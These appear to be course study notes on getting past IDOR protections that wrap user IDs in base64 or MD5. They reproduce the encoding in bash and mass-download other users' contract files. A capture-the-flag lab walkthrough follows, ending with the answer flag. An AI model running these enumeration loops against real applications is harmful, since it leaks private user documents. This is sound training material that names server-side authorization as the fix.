# Section 9 — Bypassing Encoded References

---

## When Direct References Are Disguised

Apps sometimes wrap user IDs in encoding (base64) or hashing (MD5, SHA1) to make references "look secure." But if you can replicate the encoding scheme from the front-end source, mass enumeration still works.

```
?uid=42                                       → trivially exploitable
?contract=NDI=                                → base64('42') — same risk
?contract=a1d0c6e83f027327d8461063f4ac58a6    → md5('42') — same risk if input is guessable
?contract=cdd96d3cc73d1dbdaffa03cc6cd7339b    → md5(base64('1')) — same risk
```

The pattern is always: **find the encoding scheme → reproduce it → enumerate**.

---

## Locating the Encoding Function

Always check the front-end JS. Sensitive transformations done client-side reveal themselves entirely:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Reading this:
- `uid` — the user ID
- `btoa(uid)` — base64-encode it
- `CryptoJS.MD5(...).toString()` — MD5 the result

So the `contract` parameter = `md5(base64(uid))`.

### Reproduce in bash:
```bash
echo -n "1" | base64 -w 0 | md5sum | tr -d ' -'
# cdd96d3cc73d1dbdaffa03cc6cd7339b
```

`-n` on echo and `-w 0` on base64 prevent trailing newlines that would change the hash.

---

## Common Encoding Patterns

| Encoding | Reproduce in bash |
|----------|-------------------|
| base64 | `echo -n VALUE \| base64 -w 0` |
| base64 decode | `echo -n VALUE \| base64 -d` |
| MD5 | `echo -n VALUE \| md5sum \| tr -d ' -'` |
| SHA1 | `echo -n VALUE \| sha1sum \| tr -d ' -'` |
| SHA256 | `echo -n VALUE \| sha256sum \| tr -d ' -'` |
| URL encode | `python3 -c "import urllib.parse;print(urllib.parse.quote('VALUE'))"` |
| Hex | `echo -n VALUE \| xxd -p` |
| ROT13 | `echo VALUE \| tr 'A-Za-z' 'N-ZA-Mn-za-m'` |

For nested transformations, chain pipes:
```bash
# md5(base64(uid))
echo -n "$UID" | base64 -w 0 | md5sum | tr -d ' -'

# sha256(md5(uid))
echo -n "$UID" | md5sum | awk '{print $1}' | sha256sum | tr -d ' -'
```

---

## When the Encoding Isn't In Visible JS

- Check minified JS — search for `CryptoJS`, `MD5`, `btoa`, `Base64`, `sha`
- Check loaded libraries (often hint at what's used)
- Hash-identify the output format: `echo -n HASH | wc -c` → 32=MD5, 40=SHA1, 64=SHA256
- Try brute-forcing the algorithm: hash a few known IDs with each algorithm, compare to a captured reference
- `hash-identifier` tool can sometimes name the format
- Try common patterns: `md5(uid)`, `md5(uid + salt)`, `md5(timestamp + uid)`

If you have ZERO visibility into the scheme, you may need to **find a leak** instead — log files, ref headers, share URLs, or a single account creation where you control the timestamp.

---

## Mass Enumeration with Encoded References

```bash
URL="http://TARGET"

# Pattern: contract = md5(base64(uid))
for i in {1..100}; do
  hash=$(echo -n "$i" | base64 -w 0 | md5sum | tr -d ' -')
  curl -sk -OJ -X POST -d "contract=$hash" "$URL/download.php"
done

# Search dumped files
for f in *.pdf; do
  out=$(strings "$f" | grep -oE "HTB\{[^}]+\}" | head -1)
  [ -n "$out" ] && echo "$f → $out"
done
```

---

## Lab — Encoded References

**Target:** `154.57.164.71:30652`

### Inspect the front-end function

```bash
curl -sk "http://154.57.164.71:30652/contracts.php" | grep -A2 'downloadContract'
```

```javascript
function downloadContract(uid) {
    window.location = `/download.php?contract=${encodeURIComponent(btoa(uid))}`;
}
```

**Lab variation:** This version uses **`btoa(uid)` only — NO md5 wrapper** (different from the section's example). The `contract=` value is just base64 of the uid. And it's a **GET** request, not POST.

### Reproduce the encoding

```bash
echo -n "1" | base64 -w 0   # MQ==
echo -n "2" | base64 -w 0   # Mg==
echo -n "15" | base64 -w 0  # MTU=
```

### Enumerate uid 1-20

```bash
mkdir -p /tmp/contracts && cd /tmp/contracts
URL="http://154.57.164.71:30652"

for i in {1..20}; do
  b64=$(echo -n "$i" | base64 -w 0)
  curl -sk -OJ "$URL/download.php?contract=$b64"
done

# Find which file holds the flag
for f in contract_*.pdf; do
  out=$(strings "$f" | grep -oE "HTB\{[^}]+\}" | head -1)
  [ -n "$out" ] && echo "$f → $out"
done
```

Output:
```
contract_98f13708210194c475687be6106a3b84.pdf → HTB{h45h1n6_1d5_w0n7_570p_m3}
```

> The downloaded filename `contract_<md5>.pdf` is the SERVER's internal naming convention — md5 of the base64 of the uid (server hashes after receiving). Client only base64-encodes; server md5's the decoded value to look up files. Both encoding layers visible after enumeration.

**Flag:** `HTB{h45h1n6_1d5_w0n7_570p_m3}`

---

## Exam Notes

- **Always inspect front-end JS first** — sensitive transformations done client-side are entirely visible
- The section's example used `md5(base64(uid))` — the lab variant used only `btoa(uid)`. Always confirm the actual scheme.
- The downloaded filename and the request parameter may use DIFFERENT encodings — server may decode the param and re-hash for storage
- `echo -n` and `base64 -w 0` are critical — trailing newlines change hash output
- Mass enumeration always works when the reference scheme is reproducible from JS — even with multiple encoding layers
- The fix is server-side authZ — encoding/hashing the reference is **not** access control, just obfuscation
- For real bug bounty: when you see hashed IDs, immediately grep the JS for `MD5`, `SHA`, `btoa` to identify the wrapping
